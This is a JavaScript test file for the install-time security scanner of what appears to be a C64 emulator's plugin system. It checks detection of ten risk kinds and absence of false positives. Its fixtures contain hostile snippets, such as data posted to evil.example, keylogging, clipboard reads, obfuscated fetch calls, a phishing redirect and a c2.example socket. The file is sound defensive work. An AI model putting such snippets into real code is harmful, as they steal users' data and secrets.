// The install check (src/userport/scan.js): each of the ten risks is found in
// a typical example, comments do not count, what devices legitimately need is
// not flagged, and the two shipped devices come out clean.

import fs from 'node:fs';
import { scanDeviceSource } from '../../src/userport/scan.js';

let testNo = 0, failing = 0, current = [];
function expect(cond, msg) { if (!cond) current.push(msg); }
function ok(label) {
  testNo++;
  if (!current.length) console.log(`ok  - test ${testNo}: ${label}`);
  else {
    failing++;
    console.log(`FAIL test ${testNo}: ${label}`);
    for (const m of current) console.log(`     - ${m}`);
    current = [];
  }
}
const ids = (src) => scanDeviceSource(src).map((f) => f.id);

const CASES = [
  ['network', "fetch('https://evil.example/x', { method: 'POST', body: data });"],
  ['network', 'new WebSocket(url);'],
  ['network', 'navigator.sendBeacon(u, d);'],
  ['network', 'new Image().src = u + secret;'],
  ['storage', "const rom = localStorage.getItem('c64emu.rom.kernal');"],
  ['storage', "indexedDB.open('c64emu-userport-devices');"],
  ['storage', 'const c = document.cookie;'],
  ['dynamic-code', 'eval(code);'],
  ['dynamic-code', "const f = new Function('a', body);"],
  ['dynamic-code', "await import('https://evil.example/m.js');"],
  ['dynamic-code', "setTimeout('steal()', 10);"],
  ['input', "document.addEventListener('keydown', log);"],
  ['input', 'navigator.clipboard.readText();'],
  ['input', "addEventListener('paste', grab);"],
  ['internals', 'window.machine.mem.ram[0x0801] = 0;'],
  ['internals', 'globalThis.c64.loadPRG(x);'],
  ['persistence', "navigator.serviceWorker.register('/sw.js');"],
  ['persistence', "caches.open('x');"],
  ['navigation', "location.href = 'https://phish.example';"],
  ['navigation', "window.open('https://ads.example');"],
  ['navigation', "history.pushState({}, '', '/login');"],
  ['hidden', "globalThis['fe' + 'tch'](u);"],
  ['hidden', "const s = atob('ZmV0Y2g=');"],
  ['hidden', 'String.fromCharCode(102, 101, 116, 99, 104, 40);'],
  ['hidden', `const blob = '${'QUFB'.repeat(60)}';`],
  ['hidden', `const x = 1;${' '.repeat(1100)}const y = 2;`],
  ['page', "document.body.append(fakeDialog);"],
  ['page', "document.querySelector('#btn-power').click();"],
  ['page', 'window.top.postMessage(x);'],
  ['background', "new Worker('miner.js');"],
  ['background', 'WebAssembly.instantiate(bytes);'],
  ['background', 'navigator.mediaDevices.getUserMedia({ video: true });'],
];

{
  for (const [id, src] of CASES) {
    expect(ids(src).includes(id), `${id} not found in: ${src.slice(0, 60)}`);
  }
  const seen = new Set(CASES.map(([id]) => id));
  expect(seen.size === 10, `ten risks covered, got ${seen.size}`);
  ok('each of the ten risks is found in typical code');
}

{
  const benign = `
    // fetch(url) and localStorage in a comment are not code
    /* eval(x); location.href = y; */
    const el = document.createElement('div');
    el.addEventListener('click', () => {});
    const s = host.openSocket('bbs.example', 23);
    host.storage.set('k', 1);
    const text = String.fromCharCode(b);
    const fetchCount = 1;
    if (a === b) { const locationKnown = true; }
  `;
  const found = scanDeviceSource(benign);
  expect(found.length === 0, `nothing flagged in what devices need: ${JSON.stringify(found.map((f) => [f.id, f.lines]))}`);
  ok('comments, createElement, click listeners, host.openSocket and host.storage are not flagged');
}

{
  const src = "const a = 1;\n\nfetch('https://evil.example/log?d=' + x);\nconst u = 'wss://c2.example/ws';\n";
  const net = scanDeviceSource(src).find((f) => f.id === 'network');
  expect(net && net.lines.join(',') === '3', `line numbers point at the code: ${net?.lines}`);
  expect(net && net.addresses.includes('https://evil.example/log?d=') && net.addresses.includes('wss://c2.example/ws'), `addresses listed: ${net?.addresses}`);
  const only = scanDeviceSource("const home = 'https://example.org/docs';").find((f) => f.id === 'network');
  expect(only && only.title === 'Contains web addresses', 'an address alone is still shown');
  ok('findings give line numbers, and any web addresses in the code');
}

{
  const order = scanDeviceSource("new Worker('w.js');\nlocalStorage.x = 1;").map((f) => f.severity);
  expect(order.join(',') === 'high,medium', `most serious first: ${order}`);
  ok('high findings come before medium ones');
}

{
  for (const f of ['../../src/userport/devices/wifi-modem.js', '../../public/userport/led-board.js']) {
    const found = scanDeviceSource(fs.readFileSync(new URL(f, import.meta.url), 'utf8'));
    expect(found.length === 0, `${f.split('/').pop()} is clean: ${JSON.stringify(found)}`);
  }
  ok('the shipped devices pass the check with nothing to report');
}

console.log(failing ? `\n${failing} of ${testNo} FAILED` : `\nall ${testNo} passed`);
process.exit(failing ? 1 : 0);
